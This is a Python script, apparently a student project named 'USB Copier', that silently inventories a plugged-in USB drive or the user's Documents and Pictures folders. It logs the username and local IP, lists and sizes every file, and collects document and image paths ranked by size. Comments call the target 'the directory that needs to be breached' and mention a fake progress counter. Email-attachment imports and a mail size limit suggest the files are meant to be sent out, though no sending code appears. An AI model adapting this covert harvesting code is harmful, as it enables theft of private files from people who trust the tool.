
'''
All rights reserved with Syed Ahsan Ahmed (sa02908), a student of Habib University

##########################################################################

Frequently used variables:

way = target directory
savedir = storage directory
filespaths = path of all files in the USB
ext1 = the extensions of the contents (1 each)
txtfiles = text files paths
imgfiles = image files paths
folderdata = list of contents in the folder (path)
itsize= size of image and text files


'''

# imports

import pygame,subprocess
import socket
import os
from pygame.locals import *
import itertools
import shutil
import string
import random
from collections import Counter
import shutil, errno
import datetime
import os,time
import os, winshell,sys
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from email.mime.base import MIMEBase
from email import encoders
from win32com.client import Dispatch

# defining variables and lists (note that other things have been defined somewhere inside the code)

print('Running program')



'''ends here'''

actualDir = os.getcwd()
comp=0  # showing how much program has been completed (fake)
itsize=0 # size of image and text files
size=0 # size of usb's total data
extension=[] # list of all the extensions of all the files in the usb
imgtxt=[] # list of all the paths of all image and text files in the usb
send=[] # list of all the extensions that needs to be send
size1=24000000 # maximum size of data to be sent through mail (25 MB)
filez=[] # list of all files in usb
iconname="USB Copier" # name of icon
actualDir = actualDir
# information about the person:

name=os.getlogin() #person name
ide = os.getpid() #process id
windows=not(os.supports_bytes_environ) # whether person is using windows or not (yes, if the person is using windows)
filesopen=(os.cpu_count())-1 # number of files open right now
ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip.connect(("8.8.8.8", 80))
myip=(ip.getsockname()[0]) # local host ip address
ip.close()

# detecting USB

pat1=str(0)
if (os.path.exists('G:\\'))==True:
    pat1='G:\\'
elif (os.path.exists('F:\\'))==True:
    pat1='F:\\'
elif (os.path.exists('E:\\'))==True:
    pat1='E:\\'
elif (os.path.exists('D:\\'))==True:
    pat1='D:\\'
elif (os.path.exists(str('C:\\Users\\' + str(name) + '\\Documents'))):
    pat1=str('C:\\Users\\' + str(name) + '\\Documents')
elif (os.path.exists(str('C:\\Users\\' + str(name) + '\\My Documents'))):
    pat1=str('C:\\Users\\' + str(name) + '\\My Documents')
elif (os.path.exists(str('C:\\Users\\' + str(name) + '\\Pictures'))):
    pat1=str('C:\\Users\\' + str(name) + '\\Pictures')

# folder name

tim=datetime.datetime.now().time()
dt1=str(tim)
dt2='0'
for i in range(len(dt1)):
    if dt1[i] !=':' and dt1[i] !='.':
        dt2=dt2+str(dt1[i])

# creating the storage folder

if not os.path.exists('C:/usb storage/Console'):
    os.makedirs('C:/usb storage/Console')

# directory that needs to be breached    

way = pat1  #directory that needs to be breached
os.makedirs(str('C:/usb storage/Console/'+ dt2))
savedir=str('C:/usb storage/Console/'+ dt2) # the directory where the data needs to be stored

# gives the contents of the usb

os.chdir(way)
def get_filepaths(directory):
    file_paths = []  # List which will store all of the full filepaths.
    for root, directories, files in os.walk(directory):
        for filename in files:
            # Join the two strings in order to form the full filepath.
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)  # Add it to the list.
    return(file_paths)
filespaths=(get_filepaths(way)) # insert the usb address here
os.chdir(savedir)
file=open('USB report.txt', 'w')
for i in range(len(filespaths)):
    file.write(str(filespaths[i]+'\n'))
      
# knowing the size of data in the usb

def convert_bytes(num):
    """
    this function will convert bytes to MB.... GB... etc
    """
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if num < 1024.0:
            return "%3.1f %s" % (num, x)
        num /= 1024.0

def file_size(file_path):
    """
    this function will return the file size
    """
    if os.path.isfile(file_path):
        file_info = os.stat(file_path)
        return (file_info.st_size)

for i in range(len(filespaths)): #size of usb files in byte
    size=size+(file_size(filespaths[i]))
    
totalsize=convert_bytes(size) # size of usb files in optimized units
# storing data in the text file

file.write('\n')
file.write(str("Total files in USB = " + str(len(filespaths))+'\n'))

file.write('\n')
file.write(str("Total size of USB = " + totalsize))

# see the extension of files

ext=str("")
for i in range(len(filespaths)): #getting the extensions (inverted)
    for j in range(len(filespaths[i])-1,0,-1):
        ext=ext+filespaths[i][j]
        if filespaths[i][j]== '.' :
            break
ext=ext.split(".")
ext.pop()

def reverseString(reverseMe): #getting the extensions (non-inverted)
      mlst=[]
      a=''
      lst=list(reverseMe)
      for i in range (len(lst)):
            mlst.append(lst.pop())
      for i in range (len(mlst)):
            a=a + str(mlst[i])
      return(a)
    
for i in range(len(ext)):
    extension.append(reverseString(ext[i]))

counts=(Counter(extension))
ext1=list(counts)
lst1=[]
for i in range(len(ext1)):
    a=extension.count(ext1[i])
    lst1.append(str(str(ext1[i]) +' =  '+ str(a)+'\n'))
    
file.write('\n')
file.write('\n')
for i in range(len(lst1)):
    file.write('.'+lst1[i])

# saving files

def copyanything(src, dst):
    try:
        shutil.copytree(src, dst)
    except OSError as exc: # python >2.5
        if exc.errno == errno.ENOTDIR:
            shutil.copy(src, dst)
        else: raise

# address of all image, pdfs and text files:
        
for i in range(len(filespaths)):
    if filespaths[i][-3:]=='png' or filespaths[i][-3:]=='jpg' or filespaths[i][-3:]=='txt' or filespaths[i][-4:]=='docx' or filespaths[i][-3:]=='pdf' or filespaths[i][-4:]=='jpeg':
        imgtxt.append(filespaths[i])

file.close()

# list of things in the folder

folderdata=get_filepaths(str('C:/usb storage/Console/'+ dt2))

# list of all files with size(bytes)

for i in range(len(imgtxt)):
    lst2=[]
    var1=(file_size(imgtxt[i]))
    lst2.append(imgtxt[i])
    lst2.append(var1)
    filez.append(lst2)

# making a list of contents in ascending order (size)

def quicksort(lst,col,ascending=True):
    small=[]
    big=[]
    pivotlst=[]
    if len(lst) <=1:
        return (lst)
    else:
        randoma=random.randint(0,len(lst)-1)
        pivot=float(lst[randoma][col])
        for i in lst:
            if float(i[col])<float(pivot):
                small.append(i)
            elif float(i[col])>float(pivot):
                big.append(i)
            else :
                pivotlst.append(i)
        small=quicksort(small,col)
        big=quicksort(big,col)
        return (small+pivotlst+big)

files=quicksort(filez,1) # arrange

# making shortcut on desktop

desktop = winshell.desktop()
os.chdir(actualDir)
workingDir = os.getcwd()
path = os.path.join(desktop, str(iconname+".lnk")) # name of icon
target = r''+workingDir+'/'+iconname+'.py'
wDir = r''+workingDir+'/'+iconname+'.py'
icon = r'logo\\logo.PNG' # icon location
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()

'''
All rights reserved with Syed Ahsan Ahmed (sa02908), a student of Habib University
'''


